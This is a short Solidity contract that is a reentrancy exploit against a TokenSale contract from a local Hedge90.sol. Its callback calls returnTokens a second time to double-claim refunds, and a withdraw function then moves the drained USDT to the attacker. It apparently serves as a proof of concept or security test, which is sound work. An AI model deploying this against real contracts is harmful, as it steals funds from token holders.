// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Hedge90.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract ReentrancyAttack {
    using SafeERC20 for IERC20;

    TokenSale public tokenSale;
    IERC20 public token;
    IERC20 public usdt;
    address public attacker;
    uint256 public amountToReturn;
    uint256 public purchaseIndex;
    bool public inAttack;

    constructor(address _tokenSale, address _token, address _usdt) {
        tokenSale = TokenSale(_tokenSale);
        token = IERC20(_token);
        usdt = IERC20(_usdt);
        attacker = msg.sender;
    }

    function attack(uint256 _amountToReturn, uint256 _purchaseIndex) external {
        amountToReturn = _amountToReturn;
        purchaseIndex = _purchaseIndex;
        inAttack = true;

        token.approve(address(tokenSale), amountToReturn);
        tokenSale.returnTokens(amountToReturn, purchaseIndex);
    }

    function onTokenReceived() external {
        if (inAttack) {
            inAttack = false;
            tokenSale.returnTokens(amountToReturn, purchaseIndex);
        }
    }

    function withdraw() external {
        require(msg.sender == attacker, "Only attacker can withdraw");
        usdt.safeTransfer(attacker, usdt.balanceOf(address(this)));
    }
}
